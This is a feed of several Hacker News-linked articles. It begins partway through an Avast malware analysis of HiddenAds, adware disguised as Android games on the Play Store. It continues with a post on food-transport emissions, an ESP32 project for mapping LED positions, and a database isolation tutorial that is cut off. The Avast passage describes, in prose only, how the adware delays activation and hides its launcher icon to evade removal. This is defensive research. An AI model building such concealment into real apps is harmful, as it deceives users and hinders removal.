<div><figure><img src="https://decoded.avast.io/wp-content/uploads/sites/2/2020/06/URL-Dynamic-search-1024x731.png" alt="" srcset="https://decoded.avast.io/wp-content/uploads/sites/2/2020/06/URL-Dynamic-search-1024x731.png 1024w, https://decoded.avast.io/wp-content/uploads/sites/2/2020/06/URL-Dynamic-search-300x214.png 300w, https://decoded.avast.io/wp-content/uploads/sites/2/2020/06/URL-Dynamic-search-768x548.png 768w, https://decoded.avast.io/wp-content/uploads/sites/2/2020/06/URL-Dynamic-search.png 1052w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>URL search results find additional apps.</figcaption></figure></div>



<p>I combined these methods of searching with other accessed URLs and activities. I was able to detect over 200 HiddenAds APKs. Of these, 47 apps were active on the Play Store. Apklab.io is a great tool for initial discovery and assessment of how widespread a particular family of apps is.</p>



<h2><strong>Taking a closer look</strong></h2>



<p>When diving deeper into the apps’ code, it became apparent that the apps are in fact repackaged games with an added layer of HiddenAds code. The newer versions of these apps only had slightly different code, but overall the apps all have nearly identical HiddenAds code. The added code is intentionally obfuscated and contains the ability to hide the icon from the launcher. The apps wait for a period of time after installation, then initiate the hide icon process.</p>



<p>In <a href="https://www.apklab.io/apk.html?hash=523f50a5fac3aa3f8aaaa3dffa807c61e194b2c6a3c58eb77d89c24656dca829">Throw Master</a>, one of the apps I analyzed, a ten minute delay execution timer starts as soon as the app is installed. This allows enough time to play the first three free levels of the game. The game regularly checks the timer while in use. Meanwhile, a broadcast receiver monitors the USER_PRESENT broadcasts which indicates if the phone is unlocked. If it is, it resets the timer. Once the ten minute delay is reached, the hide icon job is triggered.</p>



<div><figure><img src="https://decoded.avast.io/wp-content/uploads/sites/2/2020/06/Code-snipper-1.png" alt="" srcset="https://decoded.avast.io/wp-content/uploads/sites/2/2020/06/Code-snipper-1.png 556w, https://decoded.avast.io/wp-content/uploads/sites/2/2020/06/Code-snipper-1-300x60.png 300w" sizes="(max-width: 556px) 100vw, 556px"><figcaption>Main launcher activity used in the hide icon process.</figcaption></figure></div>



<p>The process starts by disabling the main launcher activity, in this case <strong>SplashActivity</strong> is the main launcher activity.</p>



<div><figure><img src="https://decoded.avast.io/wp-content/uploads/sites/2/2020/06/Code-snipper-2.png" alt="" srcset="https://decoded.avast.io/wp-content/uploads/sites/2/2020/06/Code-snipper-2.png 615w, https://decoded.avast.io/wp-content/uploads/sites/2/2020/06/Code-snipper-2-300x95.png 300w" sizes="(max-width: 615px) 100vw, 615px"><figcaption>PackageManager used to disabled main launcher activity.</figcaption></figure></div>



<p><strong>PackageManager </strong>is used to hide the icon from the launcher through <strong>setComponentEnabledSetting</strong>. This setting disables the main launcher activity and as a side effect hides the app’s launcher icon. </p>



<div><figure><img src="https://decoded.avast.io/wp-content/uploads/sites/2/2020/06/Code-snipper-3.png" alt="" srcset="https://decoded.avast.io/wp-content/uploads/sites/2/2020/06/Code-snipper-3.png 646w, https://decoded.avast.io/wp-content/uploads/sites/2/2020/06/Code-snipper-3-300x142.png 300w" sizes="(max-width: 646px) 100vw, 646px"><figcaption>INSTALL_SHORTCUT is used to create a shortcut.</figcaption></figure></div>



<p>The app then creates a shortcut on the home screen using the <strong>INSTALL_SHORTCUT </strong>launcher action. The shortcut differs from a launcher icon in that, even if deleted, it doesn’t remove the application from the device.</p>



<p>The user may figure out the app is the source of the ads and delete the newly created shortcut, however, this will not remove the app from the device. To the users’ frustration, the ads will continue until the app is removed via the device app settings.</p>



<p>Once the icon is hidden, the apps start to display ads outside of the apps. The apps have the ability to display intrusive ads over other apps via banners and notifications. Several apps even open the browser to display additional ads.</p>



<h2>Play Store warning signs</h2>



<p>Another shared attribute of these apps is that the developer only has a single app on their developer profile with a generic email address. Similarly, the Terms of Service are identical for all of the apps, likely pointing to an organized campaign by one actor. These warning signs could potentially be recognized by users.</p>



<div><figure><img src="https://decoded.avast.io/wp-content/uploads/sites/2/2020/06/app-dev-1.png" alt="" srcset="https://decoded.avast.io/wp-content/uploads/sites/2/2020/06/app-dev-1.png 695w, https://decoded.avast.io/wp-content/uploads/sites/2/2020/06/app-dev-1-300x104.png 300w" sizes="(max-width: 695px) 100vw, 695px"><figcaption>Generic developer name and email address.</figcaption></figure></div>



<p>The developers likely spread out the apps under different developer profiles to avoid detection and to make the adware removal more difficult.</p>



<div><figure><img src="https://decoded.avast.io/wp-content/uploads/sites/2/2020/06/app-dev-2-1.png" alt="" srcset="https://decoded.avast.io/wp-content/uploads/sites/2/2020/06/app-dev-2-1.png 866w, https://decoded.avast.io/wp-content/uploads/sites/2/2020/06/app-dev-2-1-300x187.png 300w, https://decoded.avast.io/wp-content/uploads/sites/2/2020/06/app-dev-2-1-768x479.png 768w" sizes="(max-width: 866px) 100vw, 866px"><figcaption>Single app attributed to each developer profile.</figcaption></figure></div>



<p>The app reviews are a potential telltale sign for the regular user as they showcase the frustration and malicious features present in the app.</p>



<div><figure><img src="https://decoded.avast.io/wp-content/uploads/sites/2/2020/06/app-dev-3-1.png" alt="" srcset="https://decoded.avast.io/wp-content/uploads/sites/2/2020/06/app-dev-3-1.png 695w, https://decoded.avast.io/wp-content/uploads/sites/2/2020/06/app-dev-3-1-253x300.png 253w" sizes="(max-width: 695px) 100vw, 695px"><figcaption>Users correctly point out the adware features of the app.</figcaption></figure></div>



<h2>Spread</h2>



<p>Combined, the apps have been downloaded more than 15 million times. Several of these apps have been on the Play Store since early May, contributing to their high downloads.</p>



<figure><table><tbody><tr><td><strong>App Name</strong></td><td><strong>Downloads</strong></td></tr><tr><td><a href="https://play.google.com/store/apps/details?id=com.draw.color.number.paint.lvye">Draw Color by Number</a></td><td>1,000,000</td></tr><tr><td><a href="https://play.google.com/store/apps/details?id=com.skate.board.fly.chute.race">Skate Board</a><a href="https://play.google.com/store/apps/details?id=com.skate.board.fly.chute.race"> – New</a></td><td>1,000,000</td></tr><tr><td><a href="https://play.google.com/store/apps/details?id=com.differences.findout.spot10">Find Hidden Differences</a></td><td>1,000,000</td></tr><tr><td><a href="https://play.google.com/store/apps/details?id=com.shooter.master.bullet.puzzle.huahong">Shoot Master</a></td><td>1,000,000</td></tr><tr><td><a href="https://play.google.com/store/apps/details?id=com.love.finddifferences.sogoodgame">Spot Hidden Differences</a></td><td>500,000</td></tr><tr><td><a href="https://play.google.com/store/apps/details?id=com.dancing.color.road.ball.run.music">Dancing Run – Color Ball Run</a></td><td>500,000</td></tr><tr><td><a href="https://play.google.com/store/apps/details?id=com.find.five.differences.puzzle.dawang">Find 5 Differences</a></td><td>500,000</td></tr><tr><td><a href="https://play.google.com/store/apps/details?id=com.cut.wood.joyworker.woodgames">Joy Woodworker</a></td><td>500,000</td></tr><tr><td><a href="https://play.google.com/store/apps/details?id=com.throw.master.toss.jump.higher">Throw Master</a></td><td>500,000</td></tr><tr><td><a href="https://play.google.com/store/apps/details?id=com.throw.into.space.toss.high.up.hang">Throw into Space</a></td><td>500,000</td></tr><tr><td><a href="https://play.google.com/store/apps/details?id=com.divide.it.cut">Divide it – Cut &amp; Slice Game</a></td><td>500,000</td></tr><tr><td><a href="https://play.google.com/store/apps/details?id=com.tony.shoot.newmigame">Tony Shoot – NEW</a></td><td>500,000</td></tr><tr><td><a href="https://play.google.com/store/apps/details?id=com.assassin.legend.killer.attack.sanyi">Assassin Legend</a></td><td>500,000</td></tr><tr><td><a href="https://play.google.com/store/apps/details?id=com.stacking.guys.newbee.game">Stacking Guys</a></td><td>500,000</td></tr><tr><td><a href="https://play.google.com/store/apps/details?id=com.play.boy.face.game">Save Your Boy</a></td><td>500,000</td></tr><tr><td><a href="https://play.google.com/store/apps/details?id=com.walkthrough.knife.assassin.hunter.baoer">Assassin Hunter 2020</a></td><td>500,000</td></tr><tr><td><a href="https://play.google.com/store/apps/details?id=com.stealinggames.run">Stealing Run</a></td><td>500,000</td></tr><tr><td><a href="https://play.google.com/store/apps/details?id=com.fly.skater.newrace.rungame">Fly Skater 2020</a></td><td>500,000</td></tr><tr><td><a href="https://play.google.com/store/apps/details?id=com.sports.disc.fly.fight">Disc Go！</a></td><td>500,000</td></tr></tbody></table><figcaption><br>Most downloaded HiddenAds discovered on Play Store.</figcaption></figure>



<p>It appears the campaign initially targeted users in India and South East Asia. Based on previous HiddenAds campaigns, the apps likely spread through game ads focused in these regions. Due to the generic developer details and Terms of Service, I cannot pinpoint where the developers of these apps are from. The map below indicates the initial 200 downloads of the <a href="https://www.apklab.io/apk.html?hash=15d9f6ebe532dc631b73d66cfd1d8ae8a608a53628bfff63924a1ed07f356559">Find 5 Differences</a> app recorded by Avast Mobile Security. The other investigated apps share a similar trend of initial downloads.</p>



<div><figure><img src="https://decoded.avast.io/wp-content/uploads/sites/2/2020/06/spread-map-1.png" alt="" srcset="https://decoded.avast.io/wp-content/uploads/sites/2/2020/06/spread-map-1.png 1015w, https://decoded.avast.io/wp-content/uploads/sites/2/2020/06/spread-map-1-300x166.png 300w, https://decoded.avast.io/wp-content/uploads/sites/2/2020/06/spread-map-1-768x425.png 768w" sizes="(max-width: 1015px) 100vw, 1015px"><figcaption>Map shows the % spread of first 200 downloads recorded by Avast.</figcaption></figure></div>



<p>I believe that the initial spread across other regions that can be seen in the map above, is likely “collateral damage” caused by the apps’ presence on the Play Store.</p>



<p>While this gives us a snapshot of the initial spread, the current prevalence of these apps differs. Based on Avast’s internal statistics, this HiddenAds campaign is currently most prevalent in Brazil, India and Turkey.</p>



<figure><table><tbody><tr><td><strong>Country</strong></td><td><strong>Share</strong></td></tr><tr><td>Brazil</td><td>21%</td></tr><tr><td>India</td><td>8.10%</td></tr><tr><td>Turkey</td><td>6.30%</td></tr><tr><td>Argentina</td><td>5.60%</td></tr><tr><td>Mexico</td><td>3.70%</td></tr></tbody></table><figcaption><br>Percentage spread of Avast users who have downloaded at least one of the HiddenAds apps in the last two weeks by country.</figcaption></figure>



<p>The HiddenAds campaign was able to spread globally due to its presence on the Play Store. Once the apps are removed from the Play Store, the user numbers will likely go down rapidly.</p>



<h2>Summary</h2>



<p>Thanks to <a href="https://www.apklab.io/">apklab.io</a>, we were able to find 47 apps violating Google’s developer <a href="https://play.google.com/about/monetization-ads/ads/">Ads</a> and <a href="https://play.google.com/about/spam-min-functionality/">Spam</a> policies, in addition to the original app we found. We have reported these to Google, and at the time of posting, Google removed 30 of the apps. Campaigns like HiddenAds apps may slip into the Play Store through obfuscating their true purpose or through incremental version updates that introduce intrusive ads and hide icon features once they have been downloaded by users. It is difficult to prevent future campaigns from making their way onto the Play Store, as the actors behind the campaign use one-off developer accounts for each uploaded app. Avast will monitor further developments of the HiddenAds campaigns through apklab.io features, as well as via automated detections.</p>



<h2>Samples</h2>



<p>Due to the number of samples, we’ve only selected the APKs that were present on the Play Store and put them into this <a href="https://docs.google.com/spreadsheets/d/19duB05JzEaXmxbW382Leby9d6gEnQbwEgI4u5Y0ZOJw/edit#gid=0">spreadsheet</a>.</p>



<h2>Tips on avoiding adware</h2>



<ul><li>Install a trustworthy antivirus app. Antivirus acts as a safety net and can protect you from adware.</li><li>Exercise caution when downloading apps. Read app reviews before installing a new app, carefully reading both positive and negative reviews. Notice if reviewers comment on whether or not the app does what it says it will do. If an app’s review includes comments like “this app doesn’t do what it promises” or “this app is packed with adware,” – think twice about downloading the app! &nbsp;Reviews like this are a sign that something isn’t right.</li><li>Always carefully check app permissions, closely looking to see if they make sense. Granting incorrect permissions can send sensitive data to cybercriminals, including information such as contacts stored on the device, media files and insights into personal chats. If anything seems out of the ordinary or beyond what seems appropriate, the app should not be downloaded.</li></ul>
                                            </div>

                </article></div>]]>
            </description>
            <link>https://decoded.avast.io/jakubvavra/hiddenads-up-to-no-good-again-and-spreading-via-android-gaming-apps/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23741108</guid>
            <pubDate>Sun, 05 Jul 2020 19:14:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Transport makes up only 6% of the greenhouse gas emissions from food]]>
            </title>
            <description>
<![CDATA[
Score 77 | Comments 69 (<a href="https://news.ycombinator.com/item?id=23741040">thread link</a>) | @shafyy
<br/>
July 5, 2020 | https://blog.yeticheese.com/eating-local-has-tiny-environmental-impact/ | <a href="https://web.archive.org/web/*/https://blog.yeticheese.com/eating-local-has-tiny-environmental-impact/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
				<p>There's a common misconception that eating locally produced foods is important from an environmental point of view. Even the <a href="https://twitter.com/UN/status/1188622911080415235">UN tweeted about it.</a> This is wrong.</p><p>Transport makes up only 6% of the greenhouse gas emissions from food:</p><figure><img src="https://blog.yeticheese.com/content/images/2020/07/How-much-of-GHGs-come-from-food-1-.png" alt="" width="3889" height="3935" srcset="https://blog.yeticheese.com/content/images/size/w600/2020/07/How-much-of-GHGs-come-from-food-1-.png 600w, https://blog.yeticheese.com/content/images/size/w1000/2020/07/How-much-of-GHGs-come-from-food-1-.png 1000w, https://blog.yeticheese.com/content/images/size/w1600/2020/07/How-much-of-GHGs-come-from-food-1-.png 1600w, https://blog.yeticheese.com/content/images/size/w2400/2020/07/How-much-of-GHGs-come-from-food-1-.png 2400w" sizes="(min-width: 720px) 720px"><figcaption>Source: <a href="https://ourworldindata.org/environmental-impacts-of-food">Our World in Data</a>.</figcaption></figure><p>The reason for this is that most foods are transported by ship and not plane. Only about 0.16% of food miles are done by plane:</p><figure><img src="https://blog.yeticheese.com/content/images/2020/07/share-food-miles-by-method.png" alt="" width="3400" height="2400" srcset="https://blog.yeticheese.com/content/images/size/w600/2020/07/share-food-miles-by-method.png 600w, https://blog.yeticheese.com/content/images/size/w1000/2020/07/share-food-miles-by-method.png 1000w, https://blog.yeticheese.com/content/images/size/w1600/2020/07/share-food-miles-by-method.png 1600w, https://blog.yeticheese.com/content/images/size/w2400/2020/07/share-food-miles-by-method.png 2400w" sizes="(min-width: 720px) 720px"><figcaption>Source: <a href="https://ourworldindata.org/grapher/share-food-miles-by-method">Our World in Data</a>.</figcaption></figure><p>It makes sense to try and avoid foods that are transported by air. Typically, those are foods which are highly perishable, such as asparagus, green beans and berries.</p><p>In some cases, eating local food even has a more negative impact on the environment than buying something that has been produced half way around the world. For example, heated greenhouses are energy intensive and can produce more greenhouse gases than transporting something for thousands of kilometers by water or road.</p><p>It's clear that avoiding meat and dairy has a much bigger impact on reducing greenhouse gas emissions.</p><p>So, why do people keep saying that we should eat local?</p><p>It could just be ignorance. However, I think that it's often a straw man argument pushed by interest groups that want to keep selling meat and dairy. It is something that is easy to do and seems to make sense on the surface to many people. Let's take another look at that UN tweet from before:</p><figure><img src="https://blog.yeticheese.com/content/images/2020/07/Screenshot-2020-07-05-at-7.18.44-PM.png" alt="" width="1194" height="634" srcset="https://blog.yeticheese.com/content/images/size/w600/2020/07/Screenshot-2020-07-05-at-7.18.44-PM.png 600w, https://blog.yeticheese.com/content/images/size/w1000/2020/07/Screenshot-2020-07-05-at-7.18.44-PM.png 1000w, https://blog.yeticheese.com/content/images/2020/07/Screenshot-2020-07-05-at-7.18.44-PM.png 1194w" sizes="(min-width: 720px) 720px"><figcaption>Source: <a href="https://twitter.com/UN/status/1188622911080415235">Tweet from @UN</a> on Oct 28, 2019.</figcaption></figure><p>In addition to eating local food, they also recommend unplugging unused appliances and using less hot water. Like avoiding plastic bags or plastic straws, this is good advice but a long shot from making a meaningful impact on climate change.</p><p>Arguments like these try to shift away the spot light from big companies who collectively make up a large chunk of the greenhouse gas emissions to individuals. People think that they did something meaningful by buying local food, which, as we have seen, is not the case.</p><p>I'm not saying that we shouldn't do those things. We absolutely should, but it shouldn't be the main talking points of organizations like the UN or WWF.</p><p>To make real change, we must eat less meat and dairy, move to more renewable energy sources and reduce air and road travel significantly.</p><p>PS: I'm only talking about the impact on climate change in this article. Eating local and organic food has other benefits such as supporting the local economy and in most cases it's a good idea to do it.</p><p>Comments or questions? Join in on the discussion on <a href="https://twitter.com/yeticheeseparty/status/1279850824378781697?s=20">this Twitter thread</a>. </p><!--kg-card-begin: html--><!-- Begin Mailchimp Signup Form -->


<div id="mc_embed_signup">
<p>
    Our plant-based Yeti Feta will be available to order soon. Leave your email below and we'll let you know when it's ready. (No newsletters or other shenanigans)
</p>

</div>

<!--End mc_embed_signup--><!--kg-card-end: html-->
			</section></div>]]>
            </description>
            <link>https://blog.yeticheese.com/eating-local-has-tiny-environmental-impact/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23741040</guid>
            <pubDate>Sun, 05 Jul 2020 19:05:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Self Organising WS2811 LEDs]]>
            </title>
            <description>
<![CDATA[
Score 29 | Comments 6 (<a href="https://news.ycombinator.com/item?id=23741036">thread link</a>) | @iamflimflam1
<br/>
July 5, 2020 | https://blog.cmgresearch.com/2020/06/05/self-organising-ws2811-leds.html | <a href="https://web.archive.org/web/*/https://blog.cmgresearch.com/2020/06/05/self-organising-ws2811-leds.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>Lots of LEDs? It’s not Christmas yet!</p>

<p>I had a big bundle of addressable WS2811 LED strings and an ESP-CAM board (an ESP32 dev board with a camera). There’s only one possible project that you can do with these components. Turn the disorganised chaos of lights into something a bit more organised.</p>

<p>As an added bonus I’ve ended up duplicating the image processing code in JavaScript so you don’t even need a camera on your ESP32 board - you can just use a plain dev board to drive the LEDs.</p>

<p>You can see the results of my efforts in the video below and I’ll run through a bit more detail of the code in the following text.</p>

<iframe width="560" height="315" src="https://www.youtube.com/embed/Ueim2Ko8VWo" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>

<p>The full sample code can be found here: <a href="https://github.com/atomic14/self-organising-leds">https://github.com/atomic14/self-organising-leds</a></p>

<p>If you want to do this yourself then you will need an ESP32 dev board of some kind and of course you’ll need some kind of addressable LEDs. I’m using the <a href="https://github.com/FastLED/FastLED">FastLED</a> library for driving the LEDs so with some small code changes you can probably support pretty much any addressable LEDs.</p>

<p><img src="https://blog.cmgresearch.com/assets/article_images/2020-06-05-ws2811/boards.jpg" alt="ESP32 and ESP-CAM Boards"></p>

<p>Our challenge comes down to a very basic problem, given access to a stream of images from a camera identity the approximate locations of each LED in 2D space. Once you’ve done that it’s a simple problem to map from each LED’s x and y location onto a frame buffer containing the pattern you want to show.</p>

<p>There’s a bunch of boiler plate code to initialise the ESP-CAM - I took inspiration from the sample code <a href="https://randomnerdtutorials.com/esp32-cam-video-streaming-face-recognition-arduino-ide/">here</a> and copied the bits I needed to get the camera up and running.</p>

<p>An important change I’ve made is only capture greyscale images at the lowest framesize:</p>

<div><div><pre><code><span>config</span><span>.</span><span>pixel_format</span> <span>=</span> <span>PIXFORMAT_GRAYSCALE</span><span>;</span>
<span>config</span><span>.</span><span>frame_size</span> <span>=</span> <span>FRAMESIZE_QQVGA</span><span>;</span>
</code></pre></div></div>

<p>And then to grab a frame from the camera we simply do:</p>

<div><div><pre><code>    <span>camera_fb_t</span> <span>*</span><span>fb</span> <span>=</span> <span>esp_camera_fb_get</span><span>();</span>
    <span>Frame</span> <span>*</span><span>frame</span> <span>=</span> <span>new</span> <span>Frame</span><span>(</span><span>fb</span><span>);</span>
    <span>esp_camera_fb_return</span><span>(</span><span>fb</span><span>);</span>
</code></pre></div></div>

<p>With our Frame class grabbing a copy of the pixels along with the width and the height of the image.</p>

<div><div><pre><code><span>pixels</span> <span>=</span> <span>(</span><span>uint8_t</span> <span>*</span><span>)</span><span>malloc</span><span>(</span><span>fb</span><span>-&gt;</span><span>height</span> <span>*</span> <span>fb</span><span>-&gt;</span><span>width</span><span>);</span>
<span>memcpy</span><span>(</span><span>pixels</span><span>,</span> <span>fb</span><span>-&gt;</span><span>buf</span><span>,</span> <span>fb</span><span>-&gt;</span><span>height</span> <span>*</span> <span>fb</span><span>-&gt;</span><span>width</span><span>);</span>
<span>width</span> <span>=</span> <span>fb</span><span>-&gt;</span><span>width</span><span>;</span>
<span>height</span> <span>=</span> <span>fb</span><span>-&gt;</span><span>height</span><span>;</span>
<span>length</span> <span>=</span> <span>fb</span><span>-&gt;</span><span>width</span> <span>*</span> <span>fb</span><span>-&gt;</span><span>height</span><span>;</span>
</code></pre></div></div>

<p>The image below shows a frame grabbed from the ESP-CAM sensor.</p>

<p><img src="https://blog.cmgresearch.com/assets/article_images/2020-06-05-ws2811/grabbed-frame.png" alt="Grabbed Frame"></p>

<p>For the JavaScript version of this code it’s a bit more complicated. One of the biggest problems is that we need to be running over HTTPS to have access to the camera - more on this later….</p>

<div><div><pre><code><span>const</span> <span>stream</span> <span>=</span> <span>await</span> <span>navigator</span><span>.</span><span>mediaDevices</span><span>.</span><span>getUserMedia</span><span>({</span>
  <span>video</span><span>:</span> <span>{</span> <span>facingMode</span><span>:</span> <span>"</span><span>environment</span><span>"</span> <span>},</span>
  <span>audio</span><span>:</span> <span>false</span><span>,</span>
<span>});</span>
<span>const</span> <span>canPlayListener</span> <span>=</span> <span>()</span> <span>=&gt;</span> <span>{</span>
  <span>// the video is loaded and we can grab frames</span>
  <span>onVideoReady</span><span>(</span><span>video</span><span>);</span>
  <span>video</span><span>.</span><span>removeEventListener</span><span>(</span><span>"</span><span>canplay</span><span>"</span><span>,</span> <span>canPlayListener</span><span>);</span>
<span>};</span>
<span>video</span><span>.</span><span>addEventListener</span><span>(</span><span>"</span><span>canplay</span><span>"</span><span>,</span> <span>canPlayListener</span><span>);</span>
<span>video</span><span>.</span><span>srcObject</span> <span>=</span> <span>stream</span><span>;</span>
<span>video</span><span>.</span><span>play</span><span>();</span>
</code></pre></div></div>

<p>Once we have a video stream coming from the camera we can grab a frame by drawing the video to a canvas context and then getting the imageData from it.</p>

<div><div><pre><code><span>function</span> <span>getVideoFrame</span><span>(</span><span>video</span><span>:</span> <span>HTMLVideoElement</span><span>,</span> <span>canvas</span><span>:</span> <span>HTMLCanvasElement</span><span>)</span> <span>{</span>
  <span>const</span> <span>width</span> <span>=</span> <span>video</span><span>.</span><span>videoWidth</span><span>;</span>
  <span>const</span> <span>height</span> <span>=</span> <span>video</span><span>.</span><span>videoHeight</span><span>;</span>
  <span>const</span> <span>context</span> <span>=</span> <span>canvas</span><span>.</span><span>getContext</span><span>(</span><span>"</span><span>2d</span><span>"</span><span>);</span>
  <span>// draw the video to the canvas</span>
  <span>context</span><span>!</span><span>.</span><span>drawImage</span><span>(</span><span>video</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>width</span><span>,</span> <span>height</span><span>);</span>
  <span>// get the raw image bytes</span>
  <span>const</span> <span>imageData</span> <span>=</span> <span>context</span><span>!</span><span>.</span><span>getImageData</span><span>(</span><span>0</span><span>,</span> <span>0</span><span>,</span> <span>width</span><span>,</span> <span>height</span><span>);</span>
  <span>// convert to greyscale</span>
  <span>const</span> <span>bytes</span> <span>=</span> <span>new</span> <span>Uint8Array</span><span>(</span><span>width</span> <span>*</span> <span>height</span><span>);</span>
  <span>for</span> <span>(</span><span>let</span> <span>y</span> <span>=</span> <span>0</span><span>;</span> <span>y</span> <span>&lt;</span> <span>height</span><span>;</span> <span>y</span><span>++</span><span>)</span> <span>{</span>
    <span>for</span> <span>(</span><span>let</span> <span>x</span> <span>=</span> <span>0</span><span>;</span> <span>x</span> <span>&lt;</span> <span>width</span><span>;</span> <span>x</span><span>++</span><span>)</span> <span>{</span>
      <span>const</span> <span>r</span> <span>=</span> <span>imageData</span><span>.</span><span>data</span><span>[(</span><span>y</span> <span>*</span> <span>width</span> <span>+</span> <span>x</span><span>)</span> <span>*</span> <span>4</span><span>];</span>
      <span>const</span> <span>g</span> <span>=</span> <span>imageData</span><span>.</span><span>data</span><span>[(</span><span>y</span> <span>*</span> <span>width</span> <span>+</span> <span>x</span><span>)</span> <span>*</span> <span>4</span> <span>+</span> <span>1</span><span>];</span>
      <span>const</span> <span>b</span> <span>=</span> <span>imageData</span><span>.</span><span>data</span><span>[(</span><span>y</span> <span>*</span> <span>width</span> <span>+</span> <span>x</span><span>)</span> <span>*</span> <span>4</span> <span>+</span> <span>2</span><span>];</span>
      <span>// https://en.wikipedia.org/wiki/Grayscale#Converting_color_to_grayscale</span>
      <span>const</span> <span>grey</span> <span>=</span> <span>Math</span><span>.</span><span>min</span><span>(</span><span>255</span><span>,</span> <span>0.299</span> <span>*</span> <span>r</span> <span>+</span> <span>0.587</span> <span>*</span> <span>g</span> <span>+</span> <span>0.114</span> <span>*</span> <span>b</span><span>);</span>
      <span>bytes</span><span>[</span><span>y</span> <span>*</span> <span>width</span> <span>+</span> <span>x</span><span>]</span> <span>=</span> <span>grey</span><span>;</span>
    <span>}</span>
  <span>}</span>
  <span>return</span> <span>bytes</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p><img src="https://blog.cmgresearch.com/assets/article_images/2020-06-05-ws2811/phone-interface.png" alt="Phone Interface"></p>

<p>Now we can grab frames we just need to grab a frame with no LEDs lit, light one LED, grab another frame and then compare the two. The difference should tell us where the LED is. To avoid noise or small movements of the camera having a bit impact we apply a guassian blur to the captured frames before taking the difference.</p>

<p>This is a of course a very naive and simple algorithm and could easily be improved on.</p>

<p>In the C++ code of the ESP32 we do all this directly in code. In the JavaScript version we call API functions on the web interface of the ESP32 to turn LEDs on and off and once we’ve finished the processing send up the calculated positions of the LEDs to the board.</p>

<p>In our ESP32 code we create a framebuffer and draw patterns into it. We then use the locations of each LED to work out what color it should be.</p>

<p><img src="https://blog.cmgresearch.com/assets/article_images/2020-06-05-ws2811/organised.jpg" alt="Organised"></p>

<p>To solve the issue of needing HTTPS to access the camera and also needing the API calls to be HTTPS as well (we can’t mix content nowadays!) we need a way of serving both the UI and the API from the ESP32 web server over HTTPS. There are web servers that support HTTPS and self signed certificates available for the ESP32 but this leads to other problems and would require a rewrite of the device code. An easy workaround to this problem is to use a service such as <a href="https://ngrok.com/">ngrok</a> to provide a secure URL from the cloud through our computer to the ESP32 device. Slightly convoluted, but it works!</p>

<p>This in only needed if you are not using an ESP-CAM and have to use your phone’s camera for calibrating the LEDs. Sign up for a free acount with ngrok and then find the IP address of your ESP32 board:</p>

<div><div><pre><code>ping espcam.local
PING espcam.local (10.0.1.17): 56 data bytes
64 bytes from 10.0.1.17: icmp_seq=0 ttl=255 time=14.343 ms
64 bytes from 10.0.1.17: icmp_seq=1 ttl=255 time=6.493 ms
</code></pre></div></div>

<p>Take the IP-Address and ask ngrok to start proxying requests for us:</p>

<div><div><pre><code>ngrok http 10.0.1.17 -inspect=false
</code></pre></div></div>

<p>You’ll need steady hands - there’s quite a lot of latency going on so the space between turning an LED on and off and grabbing a frame can be quite large. I slightly moved as I was taking the frame to show the locations so the positions are slightly off.</p>

<p><img src="https://blog.cmgresearch.com/assets/article_images/2020-06-05-ws2811/located.png" alt="LED locations"></p>

<p>Checkout the video to see how well it works - surprising for such a simple algorithm.</p>

<iframe width="560" height="315" src="https://www.youtube.com/embed/Ueim2Ko8VWo" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>

          </div></div>]]>
            </description>
            <link>https://blog.cmgresearch.com/2020/06/05/self-organising-ws2811-leds.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23741036</guid>
            <pubDate>Sun, 05 Jul 2020 19:04:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Learn about transaction isolation levels]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23740921">thread link</a>) | @lanraccoon
<br/>
July 5, 2020 | https://lanraccoon.com/2020/learn-about-transaction-isolation-levels/ | <a href="https://web.archive.org/web/*/https://lanraccoon.com/2020/learn-about-transaction-isolation-levels/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Databases are everywhere and they’re here to stay. If you’re a bit familiar with <a href="https://en.wikipedia.org/wiki/Relational_database">relational databases</a> you are probably familiar with transactions. Transactions are pretty powerful tools when working with databases. They allow multiple users to play nicely with each other while working on the same database. However, with more and more users connecting to the same database, you’re bound to run into performance issues sooner or later.&nbsp;</p>
<p>Powerful as they are, transactions are a double edge sword. Used incorrectly they can, and will eat up your database’s resources. Transaction isolation levels, are a way to fine-tune the I (Isolation) bit of ACID (Atomicity, Consistency, Isolation, Durability). You can increase concurrency if you are willing to make a compromise about what <em>Isolated </em>actually means.&nbsp;</p>
<h3>Isolation issues</h3>
<p>First things first, what can possibly go wrong ? Assuming that each statement abides by the ACID principles (which they are), when multiple statements are run by different users at the same time, you can run into issues such as:&nbsp;</p>
<ul><li><strong>Dirty reads</strong> – Data is being read while in the process of being updated. For example: Bob changes a row a part of a transaction. Alice reads that row and gets the data that is saved in the database. Bob then rolls back the transaction. In this case Alice has data that technically never existed.</li><li><strong>Non-repeatable reads</strong> – Subsequent reads don’t return consistent results. For example: Alice starts a transaction that reads data on a row. Bob changes that row and commits the changes. Alice, while in the same transaction, reads the same row again and gets a new value for the data.&nbsp;</li><li><strong>Phantom reads</strong> – Subsequent select statements may return different results. For example: Alice runs a select statement with a where clause that returns multiple rows. Bob inserts a row that fits with the where clause of the statement that Alice ran previously and commits the result. Alice runs the same select statement that she previously ran, and she now gets new rows as a result.&nbsp;</li></ul>
<h3>Database locks</h3>
<p>We saw what can go wrong, now let’s see how we can defend against it. Firstly, the tools: database locks. Once a transaction acquires a lock on a resource, they can limit the access other transactions have on that same resource by preventing other transactions from acquiring their locks. This, combined with the fact that each transaction needs to acquire the appropriate lock before they make operations, gives us a pretty comprehensive and mechanism that we can play with.</p>
<p>Different databases have different models for locks, but they share common patterns:</p>
<h4>Level:</h4>
